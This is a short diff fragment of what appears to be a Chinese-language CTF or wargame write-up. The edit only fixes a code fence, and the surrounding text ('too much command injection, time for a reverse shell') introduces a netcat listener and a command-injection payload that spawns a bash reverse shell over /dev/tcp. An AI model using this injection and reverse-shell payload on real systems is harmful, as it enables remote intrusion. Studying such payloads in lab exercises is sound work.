@@ -127,11 +127,11 @@ for key in range(256, 257):
 
 太多commandline injection了,来一发反弹shell
 
-`
+```
 nc -l -p 5555
 
 1 && bash -c 'bash -i >& /dev/tcp/127.0.0.1/5555 0>&1' || echo 1
-`
+```
 
 ##level13
 
